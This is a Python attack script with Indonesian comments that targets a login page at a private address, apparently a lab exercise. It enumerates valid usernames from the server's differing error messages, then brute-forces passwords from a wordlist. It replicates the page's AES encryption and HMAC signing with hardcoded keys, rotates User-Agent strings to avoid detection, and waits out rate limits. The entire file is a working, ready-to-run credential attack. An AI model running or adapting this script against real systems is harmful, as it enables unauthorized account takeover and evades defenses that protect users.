import base64
import json
import time
import random
import hmac
import hashlib
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# --- Konfigurasi ---
AES_KEY = b"MySecretKey12345"      # 15-byte key
AES_IV = b"RandomInitVector"       # 16-byte IV
HMAC_SECRET = b"ThisIsHmacSecretKey"
BLOCK_SIZE = 16
TARGET_URL = "http://192.168.70.202:3333/login5.php"
DELAY = 1.5  # delay antar request
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

# --- Fungsi ---
def encrypt_payload(data_json):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    padded = pad(data_json.encode('utf-8'), BLOCK_SIZE)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

def hmac_sha256(message):
    return hmac.new(HMAC_SECRET, message.encode(), hashlib.sha256).hexdigest()

def send_request(username, password):
    payload = json.dumps({"username": username, "password": password})
    encrypted = encrypt_payload(payload)
    signature = hmac_sha256(encrypted)

    headers = {
        "Content-Type": "text/plain",
        "X-Signature": signature,
        "User-Agent": random.choice(USER_AGENTS)
    }

    try:
        response = requests.post(TARGET_URL, data=encrypted, headers=headers, timeout=10)
        return response.text, response.status_code
    except Exception as e:
        print(f"[!] Request error: {e}")
        return "", 0

# --- Tahap 1: Cek Username Valid ---
with open("username-wordlists.txt") as f:
    usernames = [line.strip() for line in f if line.strip()]

dummy_password = "test123"
valid_usernames = []

print("=== Mencari Username Valid ===")
for username in usernames:
    response_text, status = send_request(username, dummy_password)

    if "User tidak ditemukan" in response_text:
        print(f"[×] Username salah: {username}")
    elif "Password salah" in response_text:
        print(f"[✓] Username valid: {username}")
        valid_usernames.append(username)
    else:
        print(f"[?] Respon tidak dikenal: {username} [HTTP {status}]")
        print(response_text[:100])

    time.sleep(DELAY)

# --- Tahap 2: Brute Force Password ---
if valid_usernames:
    with open("password-wordlists.txt") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print("\n=== Brute Force Password ===")
    for username in valid_usernames:
        for password in passwords:
            response_text, status = send_request(username, password)

            if "Password salah" in response_text:
                print(f"[×] {username} | Password salah: {password}")
            elif "Selamat datang" in response_text or "berhasil" in response_text.lower():
                print(f"[✓] Login berhasil! Username: {username} | Password: {password}")
                exit(0)
            elif "Rate Limit" in response_text:
                print(f"[!] Rate limit. Menunggu 10 detik...")
                time.sleep(10)
            else:
                print(f"[?] {username} | Respon tidak dikenali [HTTP {status}]")
                print(response_text[:100])

            time.sleep(DELAY)
else:
    print("\n[!] Tidak ada username valid ditemukan.")
